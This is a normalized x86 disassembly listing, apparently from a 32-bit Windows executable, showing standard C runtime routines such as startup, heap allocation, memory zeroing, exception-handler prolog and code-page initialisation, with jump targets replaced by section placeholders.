jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_414eb0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_414f97
push 0x58
push r--data
call sub_415830
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_417807
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_416735
test eax eax
jne r-xdata
push 0x1c
call sub_414f6e
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_4177bb
mov [ ebp - 0x4 ] esi
call sub_417576
test eax eax
jns r-xdata
push 0x10
call sub_414f6e
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4174df
mov [ rw-data ] eax
call sub_417424
test eax eax
jns r-xdata
push 0x1b
call sub_41580b
call sub_4171ae
test eax eax
jns r-xdata
push 0x8
call sub_41580b
push 0x1
call sub_4155ea
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_41580b
call sub_41714f
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_41580b
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_4157ed
jmp r-xdata
push eax
call sub_4157c1
push ecx
push eax
push esi
push __dos_header
call sub_4072e1
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_415875
retn
sub_415221
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_4152db
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_416d94
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_416d52
pop ecx
mov [ esi ] eax
pop esi
sub_415315
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_4153b8
pop ecx
call sub_416d94
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_416fcc
push 0x1e
call sub_416e1d
push 0xff
call sub_415569
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_416d94
mov [ eax ] esi
push ebx
call sub_4153b8
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_416d94
mov [ eax ] esi
sub_4153b8
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_4153e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_41542c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_415315
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_415471
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417a6d
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4154bd
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417aef
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_41550b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_416d94
mov [ eax ] 0x16
call sub_416d42
or eax 0xffffffff
pop ebp
retn
sub_41553e
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_415593
mov edi edi
push esi
call sub_41643c
mov esi eax
push esi
call sub_4153a9
push esi
call sub_416bb8
push esi
call sub_417db0
push esi
call sub_417da1
push esi
call sub_417b9c
push esi
call sub_416aaf
add esp 0x18
pop esi
retn
sub_4155c6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_4155ea
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_417dbf
push r--data
push r--data
call sub_4155c6
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_417e80
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_4177e1
call sub_413278
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_417e80
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_415681
push 0x20
push r--data
call sub_415830
push 0x8
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4157ac
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_415875
retn
mov [ rw-data ] 0x1
push 0x8
call sub_417961
pop ecx
push [ ebp + 0x8 ]
call sub_415569
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_41643c
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_41643c
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_415830
push sub_415890
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_415890
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_417f3c
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_417f3c
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_41808b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_418042
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_417f3c
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_417f3c
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_418072
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_41808b
mov eax [ ebp + 0xc ]
push r--data
call sub_417e80
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_417f3c
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_418059
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_417f3c
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_415a1f
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_415a4e
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_4130d0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_415ab2
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_4183d6
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_4182a9
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_4182a9
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_4130d0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_415c42
push 0xc
push r--data
call sub_415830
call sub_4165ec
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_417a3a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415cdd
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_415875
retn
push 0x20
call sub_41580b
cmp esi rw-data
je r-xdata
push esi
call sub_4152db
pop ecx
sub_415ce6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_4135f1
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_415d62
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_415ce6
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_415a4e
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4130d0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_415a1f
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_415ab2
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4130d0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_415a1f
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_415f4b
push 0x14
push r--data
call sub_415830
or [ ebp - 0x20 ] 0xffffffff
call sub_4165ec
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_415c42
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_415ce6
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_41542c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_415875
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
